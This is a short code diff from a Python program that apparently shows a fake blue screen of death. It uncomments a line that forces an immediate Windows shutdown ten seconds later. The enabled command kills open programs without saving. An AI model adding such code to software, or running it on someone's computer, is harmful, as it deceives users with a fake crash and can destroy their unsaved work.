@@ -154,7 +154,7 @@ def show_bsod():
 
 def start_shutdown_timer():
     time.sleep(10)
-    #subprocess.run(["shutdown", "/s", "/f", "/t", "0"])
+    subprocess.run(["shutdown", "/s", "/f", "/t", "0"])
 
 
 # =========================
